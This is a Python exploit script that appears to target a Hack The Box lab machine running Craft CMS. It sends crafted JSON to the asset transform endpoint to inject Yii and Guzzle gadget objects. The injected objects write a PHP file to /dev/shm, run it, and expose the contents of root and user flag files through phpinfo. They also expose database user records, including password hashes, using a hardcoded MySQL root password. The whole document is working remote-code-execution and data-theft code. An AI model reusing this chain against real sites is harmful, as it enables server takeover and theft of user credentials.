import requests, re, base64, time

HOST = 'http://orion.htb'

def inject_b64(php_code):
    b64 = base64.b64encode(php_code.encode()).decode()
    return 'php://filter/read=convert.base64-decode/resource=data://text/plain;base64,' + b64

# Write env_setter.php to /dev/shm/
php_setter = (
    '<?php '
    '$uf = @file_get_contents("/home/adam/user.txt"); '
    '$rf = @file_get_contents("/root/root.txt"); '
    '$_ENV["EXFIL_UF"] = $uf !== false ? trim($uf) : "NO_UF"; '
    '$_ENV["EXFIL_RF"] = $rf !== false ? trim($rf) : "NO_RF"; '
    'try { '
    '  $db = new PDO("mysql:host=127.0.0.1;dbname=orion", "root", "SuperSecureCraft123Pass!"); '
    '  $us = $db->query("SELECT id,username,email,password,admin FROM users")->fetchAll(PDO::FETCH_ASSOC); '
    '  $_ENV["EXFIL_USERS"] = json_encode($us); '
    '} catch (Exception $e) { $_ENV["EXFIL_DBERR"] = $e->getMessage(); } '
    '?>'
)

print("[*] Step 1: Writing env_setter.php ...")
s = requests.Session()
s.get(f'{HOST}/index.php?p=admin/dashboard')
r2 = s.get(f'{HOST}/index.php?p=admin/dashboard')
m = re.search(r'csrfTokenValue":"([^"]+)"', r2.text)
tok = m.group(1) if m else ''
b64 = base64.b64encode(php_setter.encode()).decode()
write_code = '<?php file_put_contents("/dev/shm/env_setter.php", base64_decode("' + b64 + '")); ?>'
body = {"assetId":11,"handle":{"width":1,"height":1,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"yii\\rbac\\PhpManager","__construct()":[{"itemFile":inject_b64(write_code)}]}}}
headers = {'Content-Type':'application/json','X-CSRF-Token':tok}
r = s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=body, headers=headers, timeout=30)
print(f"    Status: {r.status_code}")
time.sleep(2)

# Step 2: FnStream with as session behavior that includes env_setter.php
print("[*] Step 2: Using FnStream + as session(PhpManager) + _fn_close=phpinfo ...")
s2 = requests.Session()
s2.get(f'{HOST}/index.php?p=admin/dashboard')
r3 = s2.get(f'{HOST}/index.php?p=admin/dashboard')
m2 = re.search(r'csrfTokenValue":"([^"]+)"', r3.text)
tok2 = m2.group(1) if m2 else ''

body2 = {
    "assetId": 11,
    "handle": {
        "width": 1,
        "height": 1,
        "as session": {
            "class": "craft\\behaviors\\FieldLayoutBehavior",
            "__class": "yii\\rbac\\PhpManager",
            "__construct()": [{"itemFile": "/dev/shm/env_setter.php"}]
        },
        "__class": "GuzzleHttp\\Psr7\\FnStream",
        "__construct()": [[]],
        "_fn_close": "phpinfo"
    }
}
headers2 = {'Content-Type':'application/json','X-CSRF-Token':tok2}
r4 = s2.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=body2, headers=headers2, timeout=60)

print(f"    Status: {r4.status_code}, Len: {len(r4.text)}")
t = r4.text

if 'PHP Version' in t:
    print('[+] PHPINFO FOUND!')
    # Search for our EXFIL env vars
    for kw in ['EXFIL_UF', 'EXFIL_RF', 'EXFIL_USERS', 'EXFIL_DBERR']:
        if kw in t:
            idx = t.index(kw)
            print(f'\n[+] "{kw}" at byte {idx}')
            start = max(0, idx - 100)
            end = min(len(t), idx + 300)
            context = t[start:end]
            context_clean = context.replace('&gt;', '>').replace('&lt;', '<').replace('<br />', '\n')
            print(f'    Context: {context_clean}')
    
    # Also check the PHP Variables section
    if 'PHP Variables' in t:
        pv_idx = t.index('PHP Variables')
        pv_section = t[pv_idx:pv_idx+2000]
        print(f'\nPHP Variables section:')
        print(pv_section[:1500])

    # Check for any flags in the raw output
    for pattern in ['HTB{', 'FLAG', 'flag{']:
        if pattern in t:
            idx = t.index(pattern)
            print(f'\n[+] "{pattern}" found at byte {idx}!')
            print(f'    Context: {t[max(0,idx-20):idx+100]}')
else:
    print('[-] phpinfo NOT found')
    print(f'First 500: {t[:500]}')
    print(f'Last 500: {t[-500:]}')
